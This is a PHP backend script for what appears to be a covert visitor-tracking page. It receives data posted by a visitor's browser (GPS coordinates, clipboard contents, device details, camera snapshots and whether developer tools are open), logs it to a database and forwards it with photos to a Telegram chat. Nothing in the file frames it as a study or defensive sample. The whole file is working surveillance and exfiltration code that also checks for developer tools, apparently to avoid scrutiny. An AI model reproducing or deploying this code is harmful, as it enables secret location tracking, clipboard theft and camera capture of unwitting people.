<?php
require_once 'config.php';
require_once 'lib/utils.php';
require_once 'lib/database.php';

header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);
if (!$data) exit;

// --- Session & Basic Info ---
$session_id = $data['session'] ?? generateSessionID();
$ip = getClientIP();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$time = date('Y-m-d H:i:s');

// --- Geolocation ---
$lat = $data['lat'] ?? null;
$lon = $data['lon'] ?? null;
$accuracy = $data['accuracy'] ?? null;

// --- Device Info ---
$device = parseDevice($ua);
$browser = parseBrowser($ua);
$battery = json_encode($data['battery'] ?? []);
$charging = $data['charging'] ?? 'N/A';
$theme = $data['theme'] ?? 'unknown';
$orientation = $data['orientation'] ?? '';
$light = $data['light'] ?? '';
$screen = $data['screen'] ?? '';
$focus = $data['focus'] ?? '';
$clipboard = $data['clipboard'] ?? '';
$referrer = $data['referrer'] ?? '';
$devtools = $data['devtools'] ?? 'no';

// --- IP Lookup ---
$locationInfo = lookupIP($ip);
$country = $locationInfo['country'] ?? 'Unknown';
$city = $locationInfo['city'] ?? '';
$region = $locationInfo['regionName'] ?? '';
$carrier = ipCarrier($ip);
$locationStr = $city ? "$city, $region ($country)" : $country;

// --- PostgreSQL Insert ---
$db = getDatabase();
$stmt = $db->prepare("INSERT INTO logs (
    session_id, ip, ua, device, browser, lat, lon, accuracy, battery, charging,
    clipboard, theme, screen, referrer, focus, orientation, ambient_light, devtools,
    location, carrier, created_at
) VALUES (
    :session, :ip, :ua, :device, :browser, :lat, :lon, :accuracy, :battery, :charging,
    :clipboard, :theme, :screen, :referrer, :focus, :orientation, :light, :devtools,
    :location, :carrier, :created_at
)");

$stmt->execute([
    ':session' => $session_id,
    ':ip' => $ip,
    ':ua' => $ua,
    ':device' => $device,
    ':browser' => $browser,
    ':lat' => $lat,
    ':lon' => $lon,
    ':accuracy' => $accuracy,
    ':battery' => $battery,
    ':charging' => $charging,
    ':clipboard' => $clipboard,
    ':theme' => $theme,
    ':screen' => $screen,
    ':referrer' => $referrer,
    ':focus' => $focus,
    ':orientation' => $orientation,
    ':light' => $light,
    ':devtools' => $devtools,
    ':location' => $locationStr,
    ':carrier' => $carrier,
    ':created_at' => $time
]);

// --- Telegram Message ---
$msg = "📍 <b>New Visitor</b>\n"
    . "🆔 <b>Session:</b> <code>$session_id</code>\n"
    . "🌐 <b>IP:</b> <code>$ip</code>\n"
    . "📶 <b>Carrier:</b> $carrier - $locationStr\n"
    . "📱 <b>Device:</b> $device / $browser\n"
    . "📍 <b>GPS:</b> $lat, $lon (±$accuracy m)\n"
    . "🔋 <b>Battery:</b> $battery\n"
    . "🎨 <b>Theme:</b> $theme\n"
    . "📋 <b>Clipboard:</b> " . ($clipboard ? '✔️' : '❌') . "\n"
    . "🔗 <b>Referrer:</b> $referrer\n"
    . "🖥 <b>Screen:</b> $screen\n"
    . "🧭 <b>Orientation:</b> $orientation\n"
    . "💡 <b>Light:</b> $light\n"
    . "🛠 <b>DevTools:</b> " . ($devtools === 'yes' ? '❌ Detected' : '✅ Clean') . "\n"
    . "🕒 <b>Time:</b> $time";

sendTelegramMessage($msg);

// --- Handle Snapshots ---
if (!empty($data['photos']) && is_array($data['photos'])) {
    foreach ($data['photos'] as $i => $b64) {
        $saved = saveBase64Image($b64, "session{$session_id}_{$i}");
        if ($saved) {
            sendTelegramPhoto($saved, "📸 Snapshot #".($i+1)." from session $session_id");
        }
    }
}

echo json_encode(['status' => 'ok']);